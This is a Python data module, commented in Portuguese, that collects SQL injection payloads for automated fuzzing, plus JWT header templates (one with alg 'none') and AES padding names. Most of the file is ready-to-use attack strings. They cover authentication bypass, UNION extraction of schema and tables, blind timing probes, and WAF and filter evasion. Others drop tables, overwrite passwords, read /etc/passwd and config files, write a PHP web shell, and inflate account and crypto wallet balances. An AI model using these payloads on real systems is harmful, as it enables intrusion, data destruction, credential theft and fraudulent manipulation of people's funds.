"""
Payloads avançados para fuzzing e SQLi automatizada.
"""

SQL_PAYLOADS = {
    "Detecção Básica": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*"
    ],
    
    "Bypass de Autenticação": [
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or '1'='1' or '",
        "') or ('1'='1"
    ],
    
    "Manipulação de Saldo": [
        # Atualização direta de saldo
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        
        # Incremento de saldo existente
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE accounts SET balance=balance+100000 WHERE account_id=1; --",
        
        # Manipulação de múltiplas tabelas
        "'; UPDATE users u, accounts a SET u.balance=999999.99, a.amount=999999.99 WHERE u.id=a.user_id AND u.id=1; --",
        "'; UPDATE wallet w JOIN users u ON w.user_id=u.id SET w.balance=999999.99 WHERE u.username='admin'; --",
        
        # Manipulação com subqueries
        "'; UPDATE users SET balance=(SELECT MAX(balance)+100000 FROM (SELECT balance FROM users) AS t) WHERE userid=1; --",
        "'; UPDATE accounts SET balance=(SELECT balance*2 FROM (SELECT balance FROM accounts WHERE account_type='premium') AS t) WHERE userid=1; --",
        
        # Bypass de validações
        "'; UPDATE users SET balance=CASE WHEN balance<1000000 THEN 1000000 ELSE balance*2 END WHERE userid=1; --",
        "'; UPDATE accounts SET balance=GREATEST(balance, 1000000) WHERE account_id=1; --",
        
        # Manipulação de múltiplas moedas
        "'; UPDATE wallets SET btc_balance=99.99, eth_balance=999.99, usdt_balance=999999.99 WHERE user_id=1; --",
        "'; UPDATE crypto_accounts SET balance=balance*2 WHERE currency IN ('BTC','ETH','USDT') AND user_id=1; --"
    ],
    
    "Extração de Dados": [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--"
    ],
    
    "Injeção Cega": [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND IF(1=1,SLEEP(5),0)--"
    ],
    
    "Bypass WAF": [
        "/*!50000SELECT*/",
        "'/*!31337SELECT*/",
        "/*!31337UNION*//*!31337SELECT*/"
    ],
    
    "Stacked Queries": [
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked'--",
        "'; INSERT INTO users VALUES ('hacker','hacked')--"
    ],
    
    "Extração de Arquivos": [
        "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,LOAD_FILE('/var/www/html/config.php')--"
    ],
    
    "Escrita em Arquivo": [
        "' UNION SELECT NULL,NULL,'<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/shell.php'--"
    ],
    
    "Bypass de Filtros": [
        "UnIoN/**/SeLeCt",
        "UnIoN/*&a=*/SeLeCt/*&a=*/",
        "%55nion/**/%53elect"
    ]
}

JWT_TEMPLATES = [
    {
        "alg": "HS256",
        "typ": "JWT"
    },
    {
        "alg": "RS256",
        "typ": "JWT"
    },
    {
        "alg": "ES256",
        "typ": "JWT"
    },
    {
        "alg": "PS256",
        "typ": "JWT"
    },
    {
        "alg": "none",
        "typ": "JWT"
    }
]

AES_KNOWN_PADS = [
    "PKCS7",
    "PKCS5", 
    "ISO10126",
    "ZeroPadding"
]
